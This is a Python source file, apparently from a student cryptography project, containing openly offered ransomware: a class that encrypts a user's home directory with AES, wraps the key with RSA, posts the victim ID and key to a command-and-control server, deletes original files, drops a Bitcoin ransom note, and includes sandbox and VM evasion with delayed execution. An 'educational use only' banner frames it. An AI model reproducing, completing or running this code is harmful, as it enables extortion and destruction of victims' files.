"""
Hybrid Cryptography Ransomware Core
EDUCATIONAL USE ONLY - ISOLATED LAB ENVIRONMENT REQUIRED
"""

import os
import base64
import sys
import requests
import time
import platform
import psutil
from pathlib import Path

# Add parent directory to path to allow imports from config
sys.path.insert(0, str(Path(__file__).parent.parent))
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from config.settings import Config
import uuid

class HybridRansomware:
    def __init__(self, public_key_path=None, public_key_data=None):
        self.config = Config()
        
        # Load public key
        if public_key_path:
            self.public_key = self.load_public_key_from_file(public_key_path)
        elif public_key_data:
            self.public_key = self.load_public_key_from_data(public_key_data)
        else:
            raise ValueError("Must provide either public_key_path or public_key_data")
        
        # Generate session values
        self.victim_id = str(uuid.uuid4())
        self.aes_key = os.urandom(32)  # 256-bit AES key
        self.encrypted_count = 0
        
        print(f"[+] Ransomware initialized with Victim ID: {self.victim_id}")

    def load_public_key_from_file(self, public_key_path):
        """Load RSA public key from file"""
        with open(public_key_path, "rb") as key_file:
            public_key = serialization.load_pem_public_key(
                key_file.read(),
                backend=default_backend()
            )
        return public_key

    def load_public_key_from_data(self, public_key_data):
        """Load RSA public key from binary data"""
        public_key = serialization.load_pem_public_key(
            public_key_data,
            backend=default_backend()
        )
        return public_key

    def is_analysis_environment(self):
        """Check if running in analysis/sandbox environment"""
        if not self.config.ANTI_ANALYSIS_CHECKS:
            return False
            
        print("[*] Performing environment checks...")
        
        # Check for virtual machine
        if platform.system() == "Windows":
            if any(vm in platform.platform().lower() for vm in ['vmware', 'virtual', 'qemu', 'vbox']):
                print("[-] VM detected - aborting")
                return True
        
        # Check for debugging
        if hasattr(__builtins__, '__debug__') and __debug__:
            print("[-] Debug mode detected - aborting")
            return True
            
        # Check for low resources (sandbox indicator)
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
            print("[-] Low memory detected - possible sandbox")
            return True
            
        print("[+] Environment checks passed")
        return False

    def delayed_execution(self):
        """Wait before executing to bypass sandbox timeouts"""
        if self.config.DELAY_EXECUTION:
            print(f"[*] Delaying execution for {self.config.DELAY_SECONDS} seconds...")
            for i in range(self.config.DELAY_SECONDS, 0, -1):
                print(f"    Starting in {i} seconds...", end='\r')
                time.sleep(1)
            print("\n[*] Starting encryption...")

    def encrypt_aes_key(self):
        """Encrypt AES key with RSA public key"""
        encrypted_aes_key = self.public_key.encrypt(
            self.aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return base64.b64encode(encrypted_aes_key).decode()

    def call_home(self):
        """Register victim with C2 server"""
        encrypted_aes_key = self.encrypt_aes_key()
        
        payload = {
            'victim_id': self.victim_id,
            'encrypted_key': encrypted_aes_key,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        try:
            print(f"[*] Registering with C2 server: {self.config.C2_SERVER}")
            response = requests.post(
                f"{self.config.C2_SERVER}{self.config.C2_ENDPOINTS['register']}",
                json=payload,
                timeout=10
            )
            if response.status_code == 200:
                print(f"[+] Successfully registered with C2")
                return True
        except Exception as e:
            print(f"[-] Failed to contact C2: {e}")
        
        return False

    def encrypt_file(self, file_path):
        """Encrypt a single file using AES-CFB"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            # Generate random IV for each file
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(file_data) + encryptor.finalize()
            
            # Write encrypted file with IV prepended
            encrypted_path = file_path + self.config.ENCRYPTION_EXTENSION
            with open(encrypted_path, 'wb') as file:
                file.write(iv + encrypted_data)
            
            # Remove original file
            os.remove(file_path)
            return True
            
        except Exception as e:
            print(f"[-] Error encrypting {file_path}: {str(e)}")
            return False

    def find_target_files(self, start_path):
        """Recursively find files to encrypt"""
        target_files = []
        start_path = Path(start_path)
        
        for pattern in self.config.TARGET_EXTENSIONS:
            for file_path in start_path.rglob(f"*{pattern}"):
                if not file_path.name.startswith('.') and file_path.is_file():
                    target_files.append(str(file_path))
        
        return target_files

    def drop_ransom_note(self):
        """Create ransom note for victim"""
        note_content = f"""
=============================================
YOUR FILES HAVE BEEN ENCRYPTED!
=============================================

Victim ID: {self.victim_id}
Encryption Date: {time.strftime("%Y-%m-%d %H:%M:%S UTC")}

What Happened?
- Your files were encrypted with military-grade AES-256 encryption
- File headers have been modified, making original data inaccessible
- Backups may also be encrypted if connected to this system

How to Recover Your Files:
1. Send {self.config.PAYMENT_AMOUNT} BTC to: {self.config.BITCOIN_ADDRESS}
2. Email your Victim ID to: {self.config.PAYMENT_EMAIL}
3. Wait for decryption tool and instructions

Time Limit: 72 hours

WARNING:
- Do NOT attempt to decrypt files yourself
- Do NOT modify encrypted files
- Do NOT restart your system repeatedly
- Failure to follow instructions may result in permanent data loss

=============================================
        """
        
        # Drop note in multiple locations
        locations = [
            os.path.expanduser("~/Desktop/READ_ME_FOR_DECRYPT.txt"),
            os.path.expanduser("~/READ_ME_FOR_DECRYPT.txt"),
            "READ_ME_FOR_DECRYPT.txt"
        ]
        
        for location in locations:
            try:
                with open(location, "w") as f:
                    f.write(note_content)
                print(f"[+] Ransom note dropped: {location}")
            except Exception as e:
                print(f"[-] Failed to drop note at {location}: {e}")

    def secure_cleanup(self):
        """Securely wipe AES key from memory"""
        if hasattr(self, 'aes_key'):
            # Overwrite the key in memory
            key_array = bytearray(self.aes_key)
            for i in range(len(key_array)):
                key_array[i] = 0
            self.aes_key = bytes(key_array)
            del key_array
        
        print("[+] Memory cleanup completed")

    def execute_attack(self, target_path=None):
        """Main attack sequence"""
        print(f"[*] Starting attack sequence for victim: {self.victim_id}")
        
        # Anti-analysis checks
        if self.is_analysis_environment():
            print("[-] Analysis environment detected - aborting")
            return False
        
        # Delayed execution
        self.delayed_execution()
        
        # Determine target path
        if target_path:
            attack_path = target_path
        elif self.config.TEST_MODE:
            attack_path = self.config.TEST_DIRECTORY
        else:
            attack_path = os.path.expanduser("~")
        
        print(f"[*] Target path: {attack_path}")
        
        # Step 1: Register with C2
        if not self.call_home():
            print("[-] C2 registration failed! Continuing with encryption...")
        
        # Step 2: Find and encrypt files
        print("[*] Scanning for target files...")
        target_files = self.find_target_files(attack_path)
        print(f"[*] Found {len(target_files)} files to encrypt")
        
        self.encrypted_count = 0
        for file_path in target_files:
            if self.encrypt_file(file_path):
                self.encrypted_count += 1
                if self.encrypted_count % 100 == 0:
                    print(f"[*] Progress: {self.encrypted_count}/{len(target_files)} files encrypted")
        
        # Step 3: Drop ransom note
        self.drop_ransom_note()
        
        # Step 4: Clean up
        self.secure_cleanup()
        
        print(f"[+] Attack completed. {self.encrypted_count} files encrypted.")
        print(f"[+] Victim ID for recovery: {self.victim_id}")
        return True

# Demo function for testing
def demo_encrypt():
    """Demo function for testing in isolated environment"""
    print("=== RANSOMWARE DEMO MODE ===")
    print("This will encrypt files in ./test_files/ directory only")
    
    ransomware = HybridRansomware("D:\\3rd-year\\Cryptography\\Project-Ransomeware using RSA and AES\\One-machine\\data\\public_key.pem")  # Update this path to a valid public key file
    success = ransomware.execute_attack()
    
    if success:
        print("\n✅ Demo completed successfully!")
        print(f"📝 Victim ID: {ransomware.victim_id}")
        print("🔐 Files encrypted in ./test_files/")
        print("📄 Ransom note created: READ_ME_FOR_DECRYPT.txt")
    else:
        print("\n❌ Demo failed!")
    
    return success

if __name__ == "__main__":
    demo_encrypt()